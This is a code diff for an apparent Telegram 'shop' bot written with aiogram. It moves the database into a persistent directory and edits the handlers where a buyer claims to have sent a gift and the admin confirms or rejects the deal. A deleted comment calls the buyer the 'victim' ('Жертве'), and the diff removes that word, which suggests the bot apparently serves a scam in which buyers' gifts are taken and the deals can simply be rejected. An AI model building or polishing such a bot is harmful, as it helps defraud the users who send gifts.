@@ -2,6 +2,7 @@ import asyncio
 import re
 import sqlite3
 import datetime
+import os
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, LinkPreviewOptions
 from aiogram.filters import Command
@@ -23,7 +24,18 @@ dp = Dispatcher()
 class KeyState(StatesGroup):
     waiting_for_key = State()
 
-conn = sqlite3.connect("shop.db", check_same_thread=False)
+# === ИСПРАВЛЕНИЕ ДЛЯ ХОСТИНГА (база не будет удаляться) ===
+# На Bothost (и некоторых других хостингах) корневая папка стирается. 
+# Сохраняем базу в папку данных, если она есть, иначе локально.
+data_dir = os.environ.get("DATA_DIR", "/app/data")
+try:
+    os.makedirs(data_dir, exist_ok=True)
+    db_path = os.path.join(data_dir, "shop.db")
+    conn = sqlite3.connect(db_path, check_same_thread=False)
+    conn.cursor().execute("SELECT 1") # Проверка, что база открылась
+except:
+    conn = sqlite3.connect("shop.db", check_same_thread=False) # Fallback для ПК
+
 cur = conn.cursor()
 cur.execute("""
 CREATE TABLE IF NOT EXISTS users (
@@ -233,11 +245,8 @@ async def sent_gift(callback: types.CallbackQuery):
     buyer_username = callback.from_user.username or str(buyer_id)
 
     await callback.answer()
-    
-    # Жертве пишем, что ожидаем подтверждения
     await change_message(callback.message, "⏳ <b>Ожидайте подтверждения от продавца...</b>")
     
-    # Тебе (админу) летит уведомление
     admin_text = (
         f"🔔 <b>Покупатель утверждает, что отправил подарок!</b>\n\n"
         f"Покупатель: @{buyer_username} (ID: <code>{buyer_id}</code>)\n"
@@ -248,38 +257,30 @@ async def sent_gift(callback: types.CallbackQuery):
     )
     
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Подтвердить (Подарок пришел)", callback_data=f"approve_{buyer_id}")],
-        [InlineKeyboardButton(text="❌ Отклонить (Обман)", callback_data=f"reject_{buyer_id}")]
+        [InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"approve_{buyer_id}")],
+        [InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject_{buyer_id}")]
     ])
     
     try:
         await bot.send_message(ADMIN_ID, admin_text, reply_markup=admin_kb)
     except Exception as e:
-        print("Не удалось отправить уведомление админу:", e)
+        print("Ошибка уведомления админу:", e)
 
 @dp.callback_query(F.data.startswith("approve_"))
 async def approve_gift(callback: types.CallbackQuery):
     buyer_id = int(callback.data.split("_")[1])
     await callback.answer("Подтверждено!")
-    
     await callback.message.edit_text(f"✅ Вы подтвердили сделку для ID {buyer_id}.")
-    
-    try:
-        await bot.send_message(buyer_id, "✅ <b>Продавец подтвердил получение подарка!</b>\n\nСделка успешно завершена.")
-    except:
-        pass
+    try: await bot.send_message(buyer_id, "✅ <b>Продавец подтвердил получение подарка!</b>\n\nСделка успешно завершена.")
+    except: pass
 
 @dp.callback_query(F.data.startswith("reject_"))
 async def reject_gift(callback: types.CallbackQuery):
     buyer_id = int(callback.data.split("_")[1])
     await callback.answer("Отклонено!")
-    
     await callback.message.edit_text(f"❌ Вы отклонили сделку для ID {buyer_id}.")
-    
-    try:
-        await bot.send_message(buyer_id, "❌ <b>Продавец не получил подарок.</b>\n\nСделка отменена. Если вы отправили подарок, свяжитесь с поддержкой.")
-    except:
-        pass
+    try: await bot.send_message(buyer_id, "❌ <b>Продавец не получил подарок.</b>\n\nСделка отменена. Если вы отправили подарок, свяжитесь с поддержкой.")
+    except: pass
 
 @dp.callback_query(F.data == "decline_offer")
 async def decline(callback: types.CallbackQuery):
